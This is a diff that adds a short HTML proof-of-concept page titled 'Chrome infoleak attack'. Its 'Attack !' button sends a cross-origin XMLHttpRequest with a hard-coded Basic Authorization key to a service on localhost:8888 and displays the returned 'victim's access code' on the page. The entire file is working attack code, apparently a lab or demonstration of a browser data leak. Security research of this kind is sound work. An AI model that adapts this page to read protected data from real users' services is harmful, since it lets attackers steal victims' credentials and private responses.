@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Chrome infoleak attack</title>
+</head>
+<body>
+  <p>Click on the button below to request the victim's access code <br>
+  (using key: h4ack3r)</p> 
+  <button type="button" onclick="request()">Attack !</button>
+  <pre id="log"></pre>
+  <script>
+    function reqListener () {
+      var line = document.createElement('div');
+      line.innerText = this.responseText;
+      document.getElementById('log').appendChild(line);
+    }
+    function errListener () {
+      var line = document.createElement('div');
+      line.innerText = 'Impossible to get victim resource';
+      document.getElementById('log').appendChild(line);
+    }
+    function request() {
+      const xhr = new XMLHttpRequest();
+      xhr.addEventListener("load", reqListener);
+      xhr.addEventListener("error", errListener);
+      xhr.open('GET', 'http://localhost:8888/endpoint');
+      xhr.setRequestHeader('Authorization', 'Basic ' + btoa('h4ack3r'));
+      xhr.send();
+    }
+  </script>
+</body>
+</html>
